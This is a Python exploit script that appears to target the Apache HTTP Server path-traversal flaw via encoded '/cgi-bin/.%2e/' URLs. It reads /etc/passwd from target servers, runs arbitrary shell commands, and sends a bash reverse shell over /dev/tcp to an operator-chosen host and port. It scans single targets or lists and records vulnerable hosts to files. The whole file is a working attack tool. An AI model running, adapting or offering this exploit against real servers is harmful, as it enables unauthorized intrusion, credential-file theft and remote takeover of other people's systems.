#!/usr/bin/env python3

import requests, re, subprocess, os, argparse, sys, urllib.request, socket

def exploit_rce(args, target):

    url = (target if re.match("https?://",target) else f"http://{target}")+"/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh\n"
    header = { "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36" }
    
    if args.cmd != "False":
        data = "A=|echo;"+args.cmd
        req = urllib.request.Request(url, headers=header, data=bytes(data, 'utf-8'))

    elif args.localhost != "False":
        data = "A=|echo;bash -i >& /dev/tcp/" + args.localhost + "/" + args.localport +" 0>&1"
        req = urllib.request.Request(url, headers=header, data=bytes(data, 'utf-8')) 
        urllib.request.urlopen(req, timeout=5)
        sys.exit()

    else:
        req = urllib.request.Request(url, headers=header, data=b'A=|echo;pwd')
   
    try: 
        response = urllib.request.urlopen(req, timeout=5)
        
        if response.status == 200:
            content = response.read().decode('utf-8')
            
            print("(+) Server {} is \033[1;32mvulnerable with RCE\033[1;37m" .format(target))
            f=open("success_rce.txt", "a+")
            f.write("{}\n" .format(target))
            f.close()

            if args.cmd != "False":
                print(content)
            
            else:
                req = urllib.request.Request(url, headers=header, data=b'A=|echo;pwd')

        else:
            print("(+)\033[1;31m Server {} is not vulnerable\033[1;37m" .format(target))
    
    except urllib.error.URLError as e:
        print("(+) Server {} is \033[1;31mnot vulnerable\033[1;37m" .format(target))
    
    except socket.timeout:
        print("(+) Server {} is \033[1;31mnot response\033[1;37m" .format(target))
    
    except ConnectionResetError:
        print("(+) Server {} \033[1;31mconnection reset\033[1;37m" .format(target))

def exploit(args, target):

    url = (target if re.match("https?://",target) else f"http://{target}")
    header = { "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36" }
    req = urllib.request.Request(url, headers=header)

    try:
        response = urllib.request.urlopen(req, timeout=5)

        url = (target if re.match("https?://",target) else f"http://{target}")+"/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\n"
        req = urllib.request.Request(url, headers=header)
       
        try: 
            response = urllib.request.urlopen(req, timeout=5)
            if response.status == 200:
                content = response.read().decode('utf-8')
                
                if "root:" in content:            
                    print("(+) Server {} is \033[1;32mvulnerable\033[1;37m" .format(target))
                    f=open("success.txt", "a+")
                    f.write("{}\n" .format(target))
                    f.close()

            else:
                print("(+)\033[1;31m Server {} is not vulnerable\033[1;37m" .format(target))
        
        except urllib.error.URLError as e:
            print(exploit_rce(args, target))
        
        except socket.timeout:
            print("(+) Server {} is \033[1;31mnot response\033[1;37m" .format(target))
        
        except ConnectionResetError:
            print("(+) Server {} \033[1;31mconnection reset\033[1;37m" .format(target))

    except SystemExit:
        print("(+) Server {} is \033[1;32mconnected to {}:{}\033[1;37m" .format(target,args.localhost,args.localport))

    except KeyboardInterrupt:
        print('[!] \033[1;31mAbort\033[1;37m')

    except:
        print("(+) Server {} is \033[1;31mnot reachable\033[1;37m" .format(target))

def readfile(args):

    with open(args.file, "r") as file:
        Lines = file.readlines()
        count = 0

        for line in Lines:
            count += 1
            exploit(args, line.strip())

def main(args):

    if args.target != "False":
        exploit(args, args.target)

    elif args.file != "False":
        readfile(args)

if __name__ == "__main__":
    
    ## parse argument
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", action="store", help="Target url", default="False")
    parser.add_argument("-f", "--file", action="store", help="List of target url", default="False")
    parser.add_argument("-c", "--cmd", action="store", help="RCE command", default="False")
    parser.add_argument("-l", "--localhost", action="store", help="Local IP address for reverse shell", default="False")
    parser.add_argument("-p", "--localport", action="store", help="Local port for reverse shell", default="False")
    args = parser.parse_args()

    if len(sys.argv[1:])==0:
        parser.print_help()
        parser.exit()

    try:
        main(args)

    except KeyboardInterrupt:
        print('[!] \033[1;31mAbort\033[1;37m')
